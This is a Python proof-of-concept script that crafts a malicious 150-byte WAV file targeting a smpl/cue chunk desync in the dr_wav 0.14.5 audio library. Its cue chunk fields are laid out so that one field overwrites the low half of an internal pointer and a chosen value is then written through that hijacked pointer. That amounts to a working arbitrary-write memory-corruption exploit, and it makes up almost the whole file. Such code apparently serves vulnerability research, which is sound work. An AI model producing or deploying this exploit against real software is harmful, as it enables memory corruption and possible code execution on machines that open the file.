#!/usr/bin/env python3
"""Build the crafted 150-byte RIFF for the dr_wav 0.14.5 smpl/cue desync.

This is attacker-side file crafting: the pinned dr_wav header and the consumer
source are never modified. Usage:

    make_wav.py OUTPUT_PTR_LOW [VALUE] [SMPL_LOOP_COUNT]

PTR_LOW is the 32-bit value written into cue point 0's blockStart field, which
overlaps the low half of cue.pCuePoints in the unaccounted metadata slot.
"""

import struct
import sys


def build(ptr_low, value=0x4841434B, smpl_loop_count=1):
    p = bytearray(150)

    def u16(off, v):
        struct.pack_into("<H", p, off, v & 0xFFFF)

    def u32(off, v):
        struct.pack_into("<I", p, off, v & 0xFFFFFFFF)

    p[0:4] = b"RIFF"
    u32(4, 142)
    p[8:12] = b"WAVE"

    off = 12
    p[off : off + 4] = b"fmt "
    u32(off + 4, 16)
    body = off + 8
    u16(body, 1)
    u16(body + 2, 1)
    u32(body + 4, 44100)
    u32(body + 8, 88200)
    u16(body + 12, 2)
    u16(body + 14, 16)
    off = body + 16

    p[off : off + 4] = b"data"
    u32(off + 4, 2)
    body = off + 8
    p[body : body + 2] = b"\0\0"
    off = body + 2

    p[off : off + 4] = b"smpl"
    u32(off + 4, 36)
    body = off + 8
    u32(body + 28, smpl_loop_count)
    off = body + 36

    p[off : off + 4] = b"cue "
    u32(off + 4, 52)
    body = off + 8
    u32(body, 2)
    u32(body + 4 + 0, 0x4D495348)  # "MISH" id
    u32(body + 4 + 4, 0x45455348)  # "HSEE" playOrderPosition
    p[body + 4 + 8 : body + 4 + 12] = b"data"
    u32(body + 4 + 12, 0)
    u32(body + 4 + 16, ptr_low)  # overwrites pointer low half
    u32(body + 4 + 20, 0)
    u32(body + 28 + 0, value)  # written through the hijacked pointer
    u32(body + 28 + 4, 0x42424242)
    p[body + 28 + 8 : body + 28 + 12] = b"data"
    u32(body + 28 + 12, 0)
    u32(body + 28 + 16, 0)
    u32(body + 28 + 20, 0)
    return bytes(p)


def main(argv):
    if len(argv) < 2:
        print("usage: make_wav.py OUTPUT PTR_LOW [VALUE] [SMPL_LOOP_COUNT]", file=sys.stderr)
        return 2
    ptr_low = int(argv[2], 0)
    value = int(argv[3], 0) if len(argv) > 3 else 0x4841434B
    loop_count = int(argv[4], 0) if len(argv) > 4 else 1
    data = build(ptr_low, value, loop_count)
    with open(argv[1], "wb") as f:
        f.write(data)
    print(f"wrote {argv[1]} ({len(data)} bytes) ptr_low=0x{ptr_low:08x} value=0x{value:08x} smpl_loop_count={loop_count}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
